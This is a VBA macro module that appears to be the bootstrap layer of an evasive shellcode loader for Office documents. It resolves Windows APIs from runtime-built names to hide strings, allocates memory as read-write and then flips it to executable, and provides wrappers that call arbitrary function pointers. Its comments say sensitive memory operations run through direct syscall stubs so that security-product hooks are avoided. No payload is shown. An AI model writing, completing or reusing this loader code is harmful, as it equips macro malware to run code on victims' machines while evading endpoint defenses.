Option Explicit

' ==================== Static declares (bootstrap layer) ====================
'
' Five Win32 declares plus DispCallFunc. After Syscalls.ResolveSyscalls
' runs, sensitive operations (NtAllocateVirtualMemory, NtProtectVirtualMemory,
' etc.) go through syscall stubs and these declares are not on the hot path.

Private Declare PtrSafe Function DispCallFunc Lib "oleaut32" ( _
    ByVal pvInstance As LongPtr, _
    ByVal oVft As LongPtr, _
    ByVal cc As Long, _
    ByVal vtReturn As Integer, _
    ByVal cActuals As Long, _
    ByRef prgvt As Integer, _
    ByRef prgpvarg As LongPtr, _
    ByRef pvargResult As Variant) As Long

Private Declare PtrSafe Function GetModuleHandleW Lib "kernel32" ( _
    ByVal lpModuleName As LongPtr) As LongPtr

Private Declare PtrSafe Function GetProcAddress Lib "kernel32" ( _
    ByVal hModule As LongPtr, _
    ByVal lpProcName As LongPtr) As LongPtr

Private Declare PtrSafe Function VAlloc Lib "kernel32" Alias "VirtualAlloc" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function VProtect Lib "kernel32" Alias "VirtualProtect" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flNewProtect As Long, _
    ByRef lpflOldProtect As Long) As Long

Private Declare PtrSafe Function VFree Lib "kernel32" Alias "VirtualFree" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal dwFreeType As Long) As Long

Private Const CC_STDCALL As Long = 4
Private Const VT_I8 As Integer = 20

' ==================== Public module lookup ====================

' GetMod: GetModuleHandleW with the name built as a UTF-16 Byte() at runtime.
Public Function GetMod(modName As String) As LongPtr
    Dim wide() As Byte
    wide = StringToUtf16Bytes(modName)
    GetMod = GetModuleHandleW(VarPtr(wide(0)))
End Function

' GetProc: GetProcAddress with the proc name built as an ANSI Byte() at runtime.
Public Function GetProc(hModule As LongPtr, procName As String) As LongPtr
    Dim ansi() As Byte
    ansi = StringToAnsiBytes(procName)
    GetProc = GetProcAddress(hModule, VarPtr(ansi(0)))
End Function

Private Function StringToUtf16Bytes(s As String) As Byte()
    Dim n As Long, i As Long, out() As Byte
    n = Len(s)
    ReDim out(0 To n * 2 + 1) As Byte
    For i = 1 To n
        out((i - 1) * 2) = Asc(Mid$(s, i, 1)) And &HFF
        out((i - 1) * 2 + 1) = 0
    Next i
    out(n * 2) = 0
    out(n * 2 + 1) = 0
    StringToUtf16Bytes = out
End Function

Private Function StringToAnsiBytes(s As String) As Byte()
    Dim n As Long, i As Long, out() As Byte
    n = Len(s)
    ReDim out(0 To n) As Byte
    For i = 1 To n
        out(i - 1) = Asc(Mid$(s, i, 1)) And &HFF
    Next i
    out(n) = 0
    StringToAnsiBytes = out
End Function

' ==================== RWX hygiene ====================

' AllocRW: reserve+commit RW memory. Never RWX.
Public Function AllocRW(ByVal size As LongPtr) As LongPtr
    AllocRW = VAlloc(0, size, MEM_COMMIT Or MEM_RESERVE, PAGE_READWRITE)
End Function

' MakeRX: flip an RW region to RX (executable, no write). Returns True on success.
Public Function MakeRX(ByVal address As LongPtr, ByVal size As LongPtr) As Boolean
    Dim oldProt As Long
    MakeRX = (VProtect(address, size, PAGE_EXECUTE_READ, oldProt) <> 0)
End Function

' FreeMem: release virtual memory.
Public Function FreeMem(ByVal address As LongPtr) As Boolean
    FreeMem = (VFree(address, 0, MEM_RELEASE) <> 0)
End Function

' ==================== Dispatch wrappers ====================
'
' Internal variadic dispatcher; public Call0..Call12 are thin shape-pinning
' wrappers around it. The fixed-arity public surface is intentional (see
' design spec) to give the caller a clean prototype per arg count.

Private Function CallVariadic(ByVal pFunc As LongPtr, ParamArray params() As Variant) As LongPtr
    Dim n As Long
    If UBound(params) < LBound(params) Then
        n = 0
    Else
        n = UBound(params) - LBound(params) + 1
    End If

    Dim result As Variant, hr As Long
    If n = 0 Then
        Dim dummyVt As Integer, dummyPtr As LongPtr
        hr = DispCallFunc(0, pFunc, CC_STDCALL, VT_I8, 0, dummyVt, dummyPtr, result)
        If hr = 0 Then CallVariadic = CLngPtr(result)
        Exit Function
    End If

    Dim i As Long
    Dim coerced() As Variant, vts() As Integer, ptrs() As LongPtr
    ReDim coerced(0 To n - 1)
    ReDim vts(0 To n - 1)
    ReDim ptrs(0 To n - 1)
    For i = 0 To n - 1
        coerced(i) = CLngLng(params(LBound(params) + i))
        vts(i) = VT_I8
        ptrs(i) = VarPtr(coerced(i))
    Next i

    hr = DispCallFunc(0, pFunc, CC_STDCALL, VT_I8, n, vts(0), ptrs(0), result)
    If hr = 0 Then CallVariadic = CLngPtr(result)
End Function

Public Function Call0(ByVal pFunc As LongPtr) As LongPtr
    Call0 = CallVariadic(pFunc)
End Function
Public Function Call1(ByVal pFunc As LongPtr, ByVal a1 As LongPtr) As LongPtr
    Call1 = CallVariadic(pFunc, a1)
End Function
Public Function Call2(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr) As LongPtr
    Call2 = CallVariadic(pFunc, a1, a2)
End Function
Public Function Call3(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr) As LongPtr
    Call3 = CallVariadic(pFunc, a1, a2, a3)
End Function
Public Function Call4(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr) As LongPtr
    Call4 = CallVariadic(pFunc, a1, a2, a3, a4)
End Function
Public Function Call5(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr) As LongPtr
    Call5 = CallVariadic(pFunc, a1, a2, a3, a4, a5)
End Function
Public Function Call6(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr) As LongPtr
    Call6 = CallVariadic(pFunc, a1, a2, a3, a4, a5, a6)
End Function
Public Function Call7(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr) As LongPtr
    Call7 = CallVariadic(pFunc, a1, a2, a3, a4, a5, a6, a7)
End Function
Public Function Call8(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr) As LongPtr
    Call8 = CallVariadic(pFunc, a1, a2, a3, a4, a5, a6, a7, a8)
End Function
Public Function Call9(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr, ByVal a9 As LongPtr) As LongPtr
    Call9 = CallVariadic(pFunc, a1, a2, a3, a4, a5, a6, a7, a8, a9)
End Function
Public Function Call10(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr, ByVal a9 As LongPtr, ByVal a10 As LongPtr) As LongPtr
    Call10 = CallVariadic(pFunc, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10)
End Function
Public Function Call11(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr, ByVal a9 As LongPtr, ByVal a10 As LongPtr, ByVal a11 As LongPtr) As LongPtr
    Call11 = CallVariadic(pFunc, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11)
End Function
Public Function Call12(ByVal pFunc As LongPtr, ByVal a1 As LongPtr, ByVal a2 As LongPtr, ByVal a3 As LongPtr, ByVal a4 As LongPtr, ByVal a5 As LongPtr, ByVal a6 As LongPtr, ByVal a7 As LongPtr, ByVal a8 As LongPtr, ByVal a9 As LongPtr, ByVal a10 As LongPtr, ByVal a11 As LongPtr, ByVal a12 As LongPtr) As LongPtr
    Call12 = CallVariadic(pFunc, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12)
End Function
